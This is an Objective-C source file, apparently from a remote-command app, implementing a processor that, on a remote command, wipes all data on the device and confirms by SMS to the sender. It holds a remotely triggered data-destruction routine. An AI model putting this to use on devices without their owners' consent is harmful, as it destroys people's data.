//
//  SetWipeoutProcessor.m
//  RCM
//
//  Created by Makara Khloth on 6/22/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import "SetWipeoutProcessor.h"

@interface SetWipeoutProcessor (PrivateAPI)
-(void) processFinished;
- (void) sendReplySMSWithMessage: (NSString *) aResult final: (BOOL) aFinal;
- (void) processWipeData;
@end

@implementation SetWipeoutProcessor

#pragma mark -
#pragma mark SetWipeoutProcessor initialize method

/**
 - Method name: initWithRemoteCommandData:andCommandProcessingDelegate
 - Purpose:This method is used to initialize the SetWipeoutProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData),aRemoteCmdProcessingDelegate (RemoteCmdProcessingDelegate)
 - Return description: Return SetWipeoutProcessor
 */

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData 
	andCommandProcessingDelegate: (id <RemoteCmdProcessingDelegate>) aRemoteCmdProcessingDelegate {
    DLog (@"SetWipeoutProcessor--->initWithRemoteCommandData");
	if ((self = [super initWithRemoteCommandData:aRemoteCmdData andCommandProcessingDelegate:aRemoteCmdProcessingDelegate])) {
		
	}
	return self;
}

#pragma mark -
#pragma mark RemoteCmdProcessor Methods

/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the SetWipeoutProcessor
 - Argument list and description:No Argument 
 - Return description: No return type
 */

- (void) doProcessingCommand {
    DLog (@"SetWipeoutProcessor--->doProcessingCommand");
    [self processWipeData];
}

#pragma mark -
#pragma mark SetWipeoutProcessor Private Mehods

/**
 - Method name: processWipeData
 - Purpose:This method is used to process SetWipeoutProcessor
 - Argument list and description: No argument
 - Return description:No return type
 */

- (void) processWipeData {
	DLog (@"SetWipeoutProcessor--->processWipeData");
	id <WipeDataManager> wdm = [[RemoteCmdUtils sharedRemoteCmdUtils] mWipeDataManager];
	[wdm wipeAllData:self];
	NSString *messageFormat = [[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																						  andErrorCode:_SUCCESS_];
	NSString *response = NSLocalizedString(@"kSetWipeoutDataMSG1", @"");
	NSString *replyMessage = [messageFormat stringByAppendingString:response];
	[self sendReplySMSWithMessage:replyMessage final:NO];
}

/**
 - Method name: sendReplySMSWithMessage
 - Purpose:This method is used to send the SMS reply
 - Argument list and description: aResult, message of to reply
 - Return description: No return type
 */

- (void) sendReplySMSWithMessage: (NSString *) aResult final: (BOOL) aFinal {
	DLog (@"SetWipeoutProcessor--->sendReplySMSWithMessage");
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:aResult];
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
		[[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
															   andMessage:aResult];
	}
	if (aFinal) {
		[self processFinished];
	}
}


/**
 - Method name: processFinished
 - Purpose:This method is invoked when wipe data is completed
 - Argument list and description:No Argument 
 - Return description: No return type
 */

-(void) processFinished {
	DLog (@"SetWipeoutProcessor--->processFinished");
	if ([mRemoteCmdProcessingDelegate respondsToSelector:@selector(proccessFinishedWithProcessor:andRemoteCmdData:)]) {
		[mRemoteCmdProcessingDelegate performSelector:@selector(proccessFinishedWithProcessor:andRemoteCmdData:) withObject:self withObject:mRemoteCmdData];
	}
}

- (void) wipeDataProgress: (WipeDataType) aWipeDataType error: (NSError *) aError {
	DLog (@"SetWipeoutProcessor--->wipeDataProgress:error:");
}

- (void) wipeAllDataDidFinished {
	DLog (@"SetWipeoutProcessor--->wipeAllDataDidFinished");
	NSString *messageFormat = [[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																						  andErrorCode:_SUCCESS_];
	NSString *response = NSLocalizedString(@"kSetWipeoutDataMSG2", @"");
	NSString *replyMessage = [messageFormat stringByAppendingString:response];
	[self sendReplySMSWithMessage:replyMessage final:YES];
}

#pragma mark -
#pragma mark SetWipeoutProcessor memory management

- (void) dealloc {
	DLog (@"SetWipeoutProcessor--->dealloc");
	[super dealloc];
}

@end
